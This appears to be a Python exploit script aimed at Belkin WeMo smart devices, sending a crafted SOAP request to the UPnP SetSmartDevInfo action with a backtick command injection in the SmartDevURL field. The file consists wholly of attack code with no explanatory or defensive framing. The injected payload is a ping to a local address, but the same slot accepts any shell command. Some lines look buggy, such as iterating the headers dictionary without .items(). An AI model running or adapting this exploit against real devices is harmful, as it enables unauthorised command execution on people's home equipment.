from socket import *
import re


# The main function
def wemoExploit(device, service):
    # Get the host name and host.
    hostName = 'http://192.168.1.120:49153/upnp/control/basicevent1'
    host = device.baseURL
    port = 49153
    controlURL = service.controlURL

    soapRequest = 'POST %s HTTP/1.1\r\n' % controlURL
    soapResponse = ''
    MAX_RECV = 8192
    soapEnd = re.compile('<\/.*:envelope>')

    actionName = 'SetSmartDevInfo'
    serviceType = service.type
    argList = '<SmartDevURL>`ping 192.168.1.122:8080`</SmartDevURL>'

    # Create the body of the SOAP request
    soapBody = 	"""<?xml version="1.0" encoding="utf-8"?>
    <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <s:Body>
    <u:%s xmlns:u="%s">
    %s
    </u:%s>
    </s:Body>
    </s:Envelope>
    """ % (actionName, serviceType, argList, actionName)

    # Create the headers of the SOAP request
    headers = 	{
        'Content-Type':'text/xml; charset="utf-8"',
        'SOAPACTION':'"%s#%s"' % (serviceType,actionName),
        'Content-Length': len(soapBody),
        'HOST':hostName,
        'User-Agent': 'CyberGarage-HTTP/1.0',
    }

    # Print out what we are about to send.
    print(headers)
    print("")
    print(soapBody)

    # For each head and value pair in headers
    for head,value in headers:
        # Add it to the start of the SOAPRequest
        soapRequest += '%s: %s\r\n' % (head,value)
    # After all of the headers have been added in, append the body.
    soapRequest += '\r\n%s' % soapBody
    sock = socket(AF_INET, SOCK_STREAM)
    try:
        # Set up the sockets so that the connection can be made
        sock.connect((host,port))
        # Send the exploit
        sock.send(soapRequest)
        # Receive the response from the device
        while True:
            data = sock.recv(MAX_RECV)
            if not data:
                break
            else:
                soapResponse += data
                if soapEnd.search(soapResponse.lower()) != None:
                    break
        sock.close()

        # Split the response into header and body.
        (header,body) = soapResponse.split('\r\n\r\n',1)

        # If you don't get the expected response, error out.
        if not header.upper().startswith('HTTP/1.1 200'):
            print('SOAP request failed with error code:',header.split('\r\n')[0].split(' ',1)[1])
            errorMsg = extractSingleTag(body,'errorDescription')
            if errorMsg:
                print('SOAP error message:',errorMsg)
        else:
            print(body)
    except Exception as e:
        print('Caught socket exception:',e)
        sock.close()
    except KeyboardInterrupt:
        sock.close()


def extractSingleTag(data,tag):
    startTag = "<%s" % tag
    endTag = "</%s>" % tag

    try:
        tmp = data.split(startTag)[1]
        index = tmp.find('>')
        if index != -1:
            index += 1
            return tmp[index:].split(endTag)[0].strip()
    except:
        pass
    return None